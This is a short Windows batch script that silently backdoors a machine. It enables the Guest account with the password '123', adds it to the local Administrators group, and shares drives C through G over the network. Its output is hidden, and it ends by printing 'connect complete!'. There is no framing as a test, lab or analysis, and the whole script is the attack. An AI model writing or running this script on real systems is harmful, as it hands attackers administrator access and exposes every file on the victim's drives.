@echo off
color 0a
net user guest /active:yes >nul
net user guest 123 >nul
net localgroup administrators guest /add>nul
net share c$=c:>nul
net share D$=D:>nul
net share E$=E:>nul
net share F$=f:>nul
net share g$=g:>nul
echo connect complete!
